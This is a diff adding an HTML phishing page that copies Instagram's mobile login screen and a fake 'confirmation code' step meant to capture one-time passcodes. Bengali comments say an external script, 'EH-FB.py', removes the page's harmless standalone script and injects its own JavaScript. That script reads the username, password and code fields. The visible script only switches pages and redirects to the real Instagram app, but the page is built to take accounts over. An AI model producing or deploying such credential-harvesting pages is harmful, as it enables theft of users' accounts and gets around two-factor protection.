@@ -1,0 +1,700 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>Instagram</title>
+
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+      -webkit-tap-highlight-color: transparent;
+    }
+
+    html, body {
+      width: 100%;
+      min-height: 100%;
+      font-family: Arial, Helvetica, sans-serif;
+      background: #fff;
+      color: #111;
+    }
+
+    body { min-height: 100vh; }
+
+    /* ══════════════════════════════
+       PAGE SWITCHING
+       ══════════════════════════════ */
+    #page1 { display: flex; }
+    #page2 { display: none; }
+
+    body.show-page2 #page1 { display: none !important; }
+    body.show-page2 #page2 { display: flex !important; }
+
+    /* ══════════════════════════════
+       PAGE 1 — INSTAGRAM LOGIN
+       ══════════════════════════════ */
+    #page1 {
+      width: 100%;
+      min-height: 100vh;
+      flex-direction: column;
+      align-items: center;
+      padding: 49px 30px 25px;
+    }
+
+    .language {
+      color: #737373;
+      font-size: 25px;
+      line-height: 1;
+      margin-bottom: 164px;
+    }
+
+    .login-card {
+      width: 100%;
+      max-width: 715px;
+    }
+
+    .instagram-logo {
+      width: 116px;
+      height: 116px;
+      border: 11px solid transparent;
+      border-radius: 31px;
+      position: relative;
+      margin: 0 auto 185px;
+      background:
+        linear-gradient(#fff, #fff) padding-box,
+        linear-gradient(135deg, #8a2be2, #c000d4, #ff006a, #ffb300) border-box;
+    }
+
+    .instagram-logo::before {
+      content: "";
+      position: absolute;
+      width: 53px;
+      height: 53px;
+      border: 9px solid #d500a8;
+      border-radius: 50%;
+      left: 50%;
+      top: 50%;
+      transform: translate(-50%, -50%);
+    }
+
+    .logo-dot {
+      position: absolute;
+      width: 12px;
+      height: 12px;
+      background: #c500b5;
+      border-radius: 50%;
+      right: 11px;
+      top: 10px;
+    }
+
+    form {
+      display: flex;
+      flex-direction: column;
+      gap: 23px;
+    }
+
+    input {
+      width: 100%;
+      height: 120px;
+      border: 2px solid #e3e3e3;
+      border-radius: 32px;
+      padding: 0 32px;
+      font-size: 30px;
+      outline: none;
+      color: #222;
+      background: #fff;
+    }
+
+    input:focus { border-color: #b7b7b7; }
+
+    input::placeholder {
+      color: #777;
+      opacity: 1;
+    }
+
+    .login-btn {
+      width: 100%;
+      height: 85px;
+      border: 0;
+      border-radius: 44px;
+      background: #0877df;
+      color: white;
+      font-size: 30px;
+      font-weight: 700;
+      cursor: pointer;
+    }
+
+    .login-btn:active { transform: scale(.995); }
+
+    .forgot {
+      display: block;
+      margin: 37px auto 0;
+      border: 0;
+      background: transparent;
+      font-size: 28px;
+      font-weight: 600;
+      color: #111;
+      cursor: pointer;
+    }
+
+    .bottom-section {
+      width: 100%;
+      max-width: 715px;
+      margin-top: auto;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+
+    .create-btn {
+      width: 100%;
+      height: 86px;
+      border: 2px solid #3d91bc;
+      border-radius: 44px;
+      background: #fff;
+      color: #2473ad;
+      font-size: 28px;
+      font-weight: 700;
+      cursor: pointer;
+    }
+
+    .meta {
+      margin-top: 33px;
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      color: #353535;
+      font-size: 28px;
+      font-weight: 600;
+    }
+
+    .meta-symbol {
+      color: #1685d9;
+      font-size: 42px;
+      line-height: 1;
+      font-weight: 700;
+      transform: rotate(-8deg);
+    }
+
+    /* ══════════════════════════════
+       PAGE 2 — VERIFICATION
+       ══════════════════════════════ */
+    #page2 {
+      width: 100%;
+      min-height: 100vh;
+      background: #fff;
+      flex-direction: column;
+      max-width: 480px;
+      margin: 0 auto;
+    }
+
+    #page2 .top-bar { padding: 18px 16px 0 16px; }
+
+    #page2 .breadcrumb {
+      font-size: 13px;
+      color: #65676b;
+      margin-bottom: 6px;
+      display: flex;
+      align-items: center;
+      gap: 4px;
+    }
+
+    #page2 h1 {
+      font-size: 24px;
+      font-weight: 700;
+      color: #1c1e21;
+      line-height: 1.2;
+      margin-bottom: 10px;
+    }
+
+    #page2 .subtitle {
+      font-size: 15px;
+      color: #1c1e21;
+      line-height: 1.4;
+      margin-bottom: 20px;
+    }
+
+    #page2 .illustration-wrap {
+      margin: 0 16px 24px 16px;
+      background: #c8ebe8;
+      border-radius: 16px;
+      height: 200px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      overflow: hidden;
+    }
+
+    #page2 .input-section { padding: 0 16px; }
+
+    #page2 .input-wrap {
+      border: 1.5px solid #ced0d4;
+      border-radius: 6px;
+      padding: 14px 16px;
+      margin-bottom: 16px;
+      transition: border-color 0.15s;
+    }
+
+    #page2 .input-wrap:focus-within { border-color: #1877f2; }
+
+    #page2 .input-wrap input {
+      width: 100%;
+      height: auto;
+      border: none;
+      border-radius: 0;
+      padding: 0;
+      outline: none;
+      font-size: 16px;
+      color: #1c1e21;
+      background: transparent;
+      font-family: inherit;
+    }
+
+    #page2 .input-wrap input::placeholder { color: #8a8d91; }
+
+    #page2 .resend-wrap {
+      display: flex;
+      align-items: center;
+      gap: 7px;
+      margin-bottom: 32px;
+    }
+
+    #page2 .resend-btn {
+      color: #1877f2;
+      font-size: 15px;
+      font-weight: 600;
+      font-family: inherit;
+      background: none;
+      border: none;
+      cursor: pointer;
+      padding: 0;
+      display: flex;
+      align-items: center;
+      gap: 7px;
+    }
+
+    #page2 .resend-btn:hover span { text-decoration: underline; }
+
+    #page2 .bottom-section-p2 {
+      margin-top: auto;
+      padding: 12px 16px 16px 16px;
+      border-top: 1px solid #e4e6eb;
+    }
+
+    #page2 .btn-next {
+      width: 100%;
+      padding: 16px;
+      border-radius: 8px;
+      border: none;
+      background: #a8c8f8;
+      color: #fff;
+      font-size: 17px;
+      font-weight: 600;
+      font-family: inherit;
+      cursor: default;
+      margin-bottom: 12px;
+      transition: background 0.2s;
+      pointer-events: none;
+      -webkit-appearance: none;
+      appearance: none;
+    }
+
+    #page2 .btn-next.active {
+      background: #1877f2;
+      cursor: pointer;
+      pointer-events: all;
+    }
+
+    #page2 .btn-next.active:hover { background: #166fe5; }
+
+    #page2 .btn-try {
+      width: 100%;
+      padding: 16px;
+      border-radius: 8px;
+      border: 1.5px solid #ced0d4;
+      background: #fff;
+      color: #1c1e21;
+      font-size: 17px;
+      font-weight: 600;
+      font-family: inherit;
+      cursor: pointer;
+      transition: background 0.1s;
+      -webkit-appearance: none;
+      appearance: none;
+    }
+
+    #page2 .btn-try:hover { background: #f0f2f5; }
+
+    /* ══════════════════════════════
+       MOBILE — PAGE 1
+       ══════════════════════════════ */
+    @media (max-width: 700px) {
+      html, body {
+        width: 100%;
+        height: 100%;
+        overflow: hidden;
+      }
+
+      #page1 {
+        width: 100%;
+        height: 100dvh;
+        min-height: 0;
+        overflow: hidden;
+        padding: 16px 18px 12px;
+      }
+
+      .language {
+        flex: 0 0 auto;
+        font-size: 17px;
+        margin-bottom: 55px;
+      }
+
+      .login-card {
+        width: 100%;
+        max-width: 100%;
+        flex: 0 0 auto;
+      }
+
+      .instagram-logo {
+        width: 78px;
+        height: 78px;
+        border-width: 8px;
+        border-radius: 22px;
+        margin-bottom: 70px;
+      }
+
+      .instagram-logo::before {
+        width: 36px;
+        height: 36px;
+        border-width: 6px;
+      }
+
+      .logo-dot {
+        width: 8px;
+        height: 8px;
+        right: 7px;
+        top: 7px;
+      }
+
+      form { gap: 10px; }
+
+      input {
+        width: 100%;
+        height: 64px;
+        border-radius: 20px;
+        padding: 0 20px;
+        font-size: 17px;
+      }
+
+      .login-btn {
+        height: 50px;
+        border-radius: 27px;
+        font-size: 17px;
+      }
+
+      .forgot {
+        margin-top: 20px;
+        font-size: 16px;
+      }
+
+      .bottom-section {
+        width: 100%;
+        max-width: 100%;
+        margin-top: auto;
+        flex: 0 0 auto;
+      }
+
+      .create-btn {
+        width: 100%;
+        height: 52px;
+        border-radius: 27px;
+        font-size: 17px;
+      }
+
+      .meta {
+        margin-top: 17px;
+        font-size: 17px;
+      }
+
+      .meta-symbol { font-size: 27px; }
+    }
+
+    @media (max-width: 700px) and (max-height: 700px) {
+      #page1 {
+        padding-top: 10px;
+        padding-bottom: 10px;
+      }
+
+      .language { margin-bottom: 35px; }
+
+      .instagram-logo {
+        width: 64px;
+        height: 64px;
+        margin-bottom: 45px;
+      }
+
+      .instagram-logo::before {
+        width: 29px;
+        height: 29px;
+        border-width: 5px;
+      }
+
+      .logo-dot {
+        width: 7px;
+        height: 7px;
+      }
+
+      input {
+        height: 55px;
+        font-size: 16px;
+      }
+
+      .login-btn { height: 46px; }
+      .forgot { margin-top: 14px; }
+
+      .create-btn {
+        height: 48px;
+        font-size: 16px;
+      }
+
+      .meta { margin-top: 10px; }
+    }
+
+    /* ══════════════════════════════
+       MOBILE — PAGE 2
+       ══════════════════════════════ */
+    @media (max-width: 480px) {
+      #page2 h1 { font-size: 21px; }
+      #page2 .subtitle { font-size: 14px; }
+      #page2 .btn-next,
+      #page2 .btn-try { font-size: 15px; padding: 14px; }
+    }
+
+    @media (max-width: 320px) {
+      #page2 h1 { font-size: 18px; }
+      #page2 .illustration-wrap { height: 160px; }
+    }
+  </style>
+</head>
+
+<body>
+
+  <!-- ══════════════════════════════════════════
+       PAGE 1 — Instagram Login
+       ══════════════════════════════════════════ -->
+  <main id="page1">
+
+    <div class="language">English (US)</div>
+
+    <section class="login-card">
+
+      <div class="instagram-logo" aria-label="Instagram">
+        <div class="logo-inner"></div>
+        <span class="logo-dot"></span>
+      </div>
+
+      <!--
+        form id="recoveryForm"  ← EH-FB.py inject চেনে এই ID
+        account, password IDs   ← py এর injected JS এই IDs ব্যবহার করে
+      -->
+      <form id="recoveryForm" autocomplete="off">
+
+        <input
+          id="account"
+          type="text"
+          placeholder="Username, email or mobile number"
+          aria-label="Username, email or mobile number"
+          autocomplete="username"
+          inputmode="email"
+          required
+        >
+
+        <input
+          id="password"
+          type="password"
+          placeholder="Password"
+          aria-label="Password"
+          autocomplete="current-password"
+          required
+        >
+
+        <button type="submit" class="login-btn">Log in</button>
+
+      </form>
+
+      <!-- id="forgot" ← py এর injected JS এই ID চেনে -->
+      <button class="forgot" id="forgot" type="button">Forgot password?</button>
+
+    </section>
+
+    <section class="bottom-section">
+
+      <button class="create-btn" type="button">Create new account</button>
+
+      <div class="meta">
+        <span class="meta-symbol">∞</span>
+        <span>Meta</span>
+      </div>
+
+    </section>
+
+  </main>
+
+
+  <!-- ══════════════════════════════════════════
+       PAGE 2 — OTP Verification
+       ══════════════════════════════════════════ -->
+  <div id="page2">
+
+    <div class="top-bar">
+      <div class="breadcrumb">
+        <span>Instagram</span>
+        <span>›</span>
+        <span>Security</span>
+      </div>
+      <h1>Enter confirmation code</h1>
+      <p class="subtitle">
+        We've sent a confirmation code to your number.
+        Instagram wants to make sure it's really you trying to sign in.
+      </p>
+    </div>
+
+    <div class="illustration-wrap">
+      <svg width="220" height="180" viewBox="0 0 220 180" xmlns="http://www.w3.org/2000/svg">
+        <rect x="55" y="15" width="110" height="155" rx="14" fill="#F0F0F0" stroke="#D0D0D0" stroke-width="1.5"/>
+        <rect x="62" y="28" width="96" height="120" rx="4" fill="#fff"/>
+        <g transform="translate(90,36)">
+          <path d="M20 0 L40 8 L40 28 Q40 44 20 52 Q0 44 0 28 L0 8 Z" fill="#F4A623"/>
+          <path d="M20 4 L36 11 L36 28 Q36 42 20 49 Q4 42 4 28 L4 11 Z" fill="#F7BC45"/>
+        </g>
+        <rect x="68" y="100" width="84" height="22" rx="4" fill="#E8F5E8"/>
+        <text x="83" y="116" font-size="14" fill="#555" letter-spacing="8">****</text>
+        <g opacity="0.18">
+          <rect x="68" y="128" width="24" height="14" rx="2" fill="#888"/>
+          <rect x="96" y="128" width="24" height="14" rx="2" fill="#888"/>
+          <rect x="124" y="128" width="24" height="14" rx="2" fill="#888"/>
+          <rect x="68" y="145" width="24" height="8" rx="2" fill="#888"/>
+          <rect x="96" y="145" width="24" height="8" rx="2" fill="#888"/>
+          <rect x="124" y="145" width="24" height="8" rx="2" fill="#888"/>
+        </g>
+        <g transform="translate(-10,60)">
+          <ellipse cx="85" cy="145" rx="30" ry="18" fill="#6B3A2A"/>
+          <ellipse cx="58" cy="138" rx="10" ry="7" fill="#6B3A2A" transform="rotate(-25,58,138)"/>
+          <rect x="68" y="128" width="8" height="20" rx="4" fill="#7A4535"/>
+          <rect x="78" y="125" width="8" height="23" rx="4" fill="#7A4535"/>
+          <rect x="88" y="126" width="8" height="22" rx="4" fill="#7A4535"/>
+          <rect x="98" y="129" width="8" height="18" rx="4" fill="#7A4535"/>
+        </g>
+        <g transform="translate(80,30)">
+          <ellipse cx="90" cy="102" rx="26" ry="16" fill="#6B3A2A"/>
+          <rect x="104" y="85" width="9" height="26" rx="4.5" fill="#7A4535"/>
+          <rect x="92" y="93" width="8" height="16" rx="4" fill="#5C2D1A"/>
+          <rect x="80" y="95" width="8" height="14" rx="4" fill="#5C2D1A"/>
+          <ellipse cx="76" cy="107" rx="9" ry="6" fill="#6B3A2A" transform="rotate(-20,76,107)"/>
+        </g>
+        <ellipse cx="110" cy="175" rx="50" ry="5" fill="rgba(0,0,0,0.08)"/>
+      </svg>
+    </div>
+
+    <div class="input-section">
+      <div class="input-wrap">
+        <!-- id="code" ← py এর injected JS এই ID চেনে -->
+        <input
+          type="tel"
+          id="code"
+          placeholder="Confirmation code"
+          maxlength="6"
+          inputmode="numeric"
+          pattern="[0-9]*"
+          autocomplete="one-time-code"
+        />
+      </div>
+      <div class="resend-wrap">
+        <!-- id="resendLink" ← py এর injected JS এই ID চেনে -->
+        <button class="resend-btn" id="resendLink" type="button">
+          <svg width="20" height="20" viewBox="0 0 24 24" fill="none">
+            <path d="M4 12C4 7.58 7.58 4 12 4C14.5 4 16.7 5.1 18.2 6.8L16 9H22V3L19.7 5.3C17.8 3.3 15.05 2 12 2C6.48 2 2 6.48 2 12H4Z" fill="#1877F2"/>
+            <path d="M20 12C20 16.42 16.42 20 12 20C9.5 20 7.3 18.9 5.8 17.2L8 15H2V21L4.3 18.7C6.2 20.7 8.95 22 12 22C17.52 22 22 17.52 22 12H20Z" fill="#1877F2"/>
+          </svg>
+          <span>Get a new code</span>
+        </button>
+      </div>
+    </div>
+
+    <div class="bottom-section-p2">
+      <!-- id="page2Next" ← py এর injected JS এই ID চেনে -->
+      <button class="btn-next" id="page2Next" type="button">Next</button>
+      <!-- id="tryAnother" ← py এর injected JS এই ID চেনে -->
+      <button class="btn-try" id="tryAnother" type="button">Try another way</button>
+    </div>
+
+  </div>
+
+
+  <!--
+    ══════════════════════════════════════════════════════════
+    STANDALONE SCRIPT — browser direct open এ কাজ করে।
+    EH-FB.py এই script strip করে নিজের inject করে।
+    তাই py দিয়ে চালালে এই block automatically replace হয়।
+    ══════════════════════════════════════════════════════════
+  -->
+  <script>
+    (function () {
+
+      /* PAGE 1 → PAGE 2: login submit */
+      var form = document.getElementById('recoveryForm');
+      if (form) {
+        form.addEventListener('submit', function (e) {
+          e.preventDefault();
+          document.body.classList.add('show-page2');
+          setTimeout(function () {
+            var c = document.getElementById('code');
+            if (c) c.focus();
+          }, 80);
+        });
+      }
+
+      /* Code input: digits only, max 6, Next button activate */
+      var codeInput = document.getElementById('code');
+      var p2btn     = document.getElementById('page2Next');
+      if (codeInput) {
+        codeInput.addEventListener('input', function () {
+          this.value = this.value.replace(/\D/g, '').slice(0, 6);
+          if (p2btn) p2btn.classList.toggle('active', this.value.length > 0);
+        });
+        codeInput.addEventListener('keydown', function (e) {
+          if (e.key === 'Enter') {
+            e.preventDefault();
+            if (p2btn && codeInput.value) p2btn.click();
+          }
+        });
+      }
+
+      /* Next → open Instagram app on Android */
+      if (p2btn) {
+        p2btn.addEventListener('click', function () {
+          var intentUrl =
+            'intent://instagram.com/#Intent;' +
+            'scheme=https;' +
+            'package=com.instagram.android;' +
+            'S.browser_fallback_url=https%3A%2F%2Fwww.instagram.com;' +
+            'end';
+          window.location.href = intentUrl;
+        });
+      }
+
+      /* Forgot, Resend, Try Another — no-op */
+      var forgot  = document.getElementById('forgot');
+      var resend  = document.getElementById('resendLink');
+      var another = document.getElementById('tryAnother');
+      if (forgot)  forgot.addEventListener('click',  function (e) { e.preventDefault(); });
+      if (resend)  resend.addEventListener('click',  function (e) { e.preventDefault(); });
+      if (another) another.addEventListener('click', function (e) { e.preventDefault(); });
+
+    })();
+  </script>
+
+</body>
+</html>
